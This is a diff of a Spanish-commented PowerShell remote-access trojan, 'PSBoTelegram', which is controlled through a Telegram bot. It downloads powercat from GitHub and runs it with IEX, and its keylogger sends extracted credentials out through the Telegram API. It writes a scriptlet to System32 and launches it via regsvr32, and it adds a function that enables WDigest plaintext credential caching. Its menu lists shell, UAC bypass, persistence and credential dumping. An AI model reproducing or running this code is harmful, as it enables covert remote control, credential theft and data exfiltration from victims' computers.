@@ -25,9 +25,7 @@ return $codeScript
 
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
-
 $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
-#IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
 
 ############################################################# Funciones propias #############################################################
 
@@ -243,6 +241,18 @@ Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=
 Remove-Item $ruta ;return $extraido}}} extrae_credenciales' ; $keylogger = $KeyLogger -replace "your_chat_id", $chat_id -replace "your_token" , $botkey -replace "your_extrae", $extrae ; return $KeyLogger}
 
 
+function mimikittenz {
+param($Activar)
+)
+if ($Activar -like "on" ) {$Activar="Si"} ; if ($Activar -like "off") {$Activar="No"} 
+$ruta_key = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+$key = "UseLogonCredential"
+$check_exist_key = Test-Path $ruta_key
+if ($check_exist_key -eq $null) {$check_exist_key = "False"}
+$check_valor_key = Get-ItemProperty $ruta_key | Select-Object $key ; $check_valor_key = $check_valor_key.UseLogonCredential
+if ($Activar -eq "Si") { New-ItemProperty -Path $ruta_key -Name $key -Value "1" -PropertyType DWORD -Force| Out-Null; Write-Host "`n`nAñadida clave de registro, es necesario reiniciar." } 
+if ($Activar -eq "No") {Remove-ItemProperty $ruta_key -Name $key  -Force | Out-Null ; "`n`nEliminada clave de registro, es necesario reiniciar."}
+}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
  $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
@@ -285,5 +295,6 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 </scriptlet>'
 $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
  if ($comando -like "/MimiGatoz") {mimigatoz}
-
+# if ($comando -eq "Mimikittenz") {$texto = "La funcion mimikitenz se ejecuta: `n /Mimikittenz On`n /Mimikittenz Off"}
+ if ($comando -eq "Mimikittenz") {$texto = "Proximamente.."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 }
